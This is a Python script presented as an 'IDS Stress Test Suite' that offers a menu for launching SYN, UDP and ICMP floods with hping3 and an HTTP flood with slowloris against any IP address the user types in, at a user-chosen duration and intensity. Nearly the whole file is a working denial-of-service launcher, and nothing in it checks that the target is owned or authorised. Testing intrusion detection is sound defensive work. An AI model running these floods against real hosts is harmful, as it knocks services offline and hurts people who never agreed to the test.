import subprocess
import time
import threading
import os

def check_root():
    """Ensure the script is running with root privileges."""
    if os.geteuid() != 0:
        print("[errror] This script must be run as root (sudo). Exiting.")
        exit(1)

def run_stress_test(attack_type, target_ip="127.0.0.1", duration=30, intensity=10000):
    """Simulates high-volume attack traffic to test IDS performance."""
    print(f"\n[info] [STRESS TEST] Launching {attack_type.upper()} attack on {target_ip} for {duration} seconds...")

    # Define attack commands
    attack_commands = {
        "syn_flood": ["hping3", "--flood", "-S", "-p", "80", target_ip],
        "udp_flood": ["hping3", "--flood", "-2", "-p", "53", target_ip],
        "icmp_flood": ["hping3", "--flood", "-1", target_ip],
        "http_flood": ["slowloris", "-s", str(intensity), "-v", target_ip]
    }

    if attack_type not in attack_commands:
        print("[errror] Invalid attack type. Choose from: syn_flood, udp_flood, icmp_flood, http_flood")
        return

    log_file = f"logs/stress_test_{attack_type}.log"

    def execute_attack():
        """Execute the attack in a separate thread."""
        try:
            with open(log_file, "w") as log:
                process = subprocess.Popen(attack_commands[attack_type], stdout=log, stderr=log)
                time.sleep(duration)
                process.terminate()  # Attempt to stop the attack
                process.kill()  # Force kill if terminate() fails
                subprocess.run(["pkill", "-f", attack_type], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[success] {attack_type.upper()} attack completed. Logs saved to {log_file}")
        except Exception as e:
            print(f"[errror] Error executing attack: {e}")

    attack_thread = threading.Thread(target=execute_attack)
    attack_thread.start()

def main():
    """Interactive CLI for selecting attack types."""
    check_root()  # Ensure script runs with root permissions

    print("""
    ==================================
         IDS Stress Test Suite
    ==================================
    [1] SYN Flood Attack
    [2] UDP Flood Attack
    [3] ICMP Flood Attack
    [4] HTTP Flood Attack
    [5] Exit
    """)

    while True:
        choice = input("Select an attack to stress test the IDS: ").strip()
        target_ip = input("Enter target IP address (default: 127.0.0.1): ").strip() or "127.0.0.1"

        if target_ip == "127.0.0.1":
            print("[warning] Warning: Testing against localhost!")

        try:
            duration = int(input("Enter duration in seconds (default: 30): ").strip() or 30)
            intensity = int(input("Enter intensity level (default: 10000): ").strip() or 10000)
        except ValueError:
            print("[errror] Invalid input! Please enter numeric values.")
            continue

        if choice == "1":
            run_stress_test("syn_flood", target_ip, duration, intensity)
        elif choice == "2":
            run_stress_test("udp_flood", target_ip, duration, intensity)
        elif choice == "3":
            run_stress_test("icmp_flood", target_ip, duration, intensity)
        elif choice == "4":
            run_stress_test("http_flood", target_ip, duration, intensity)
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
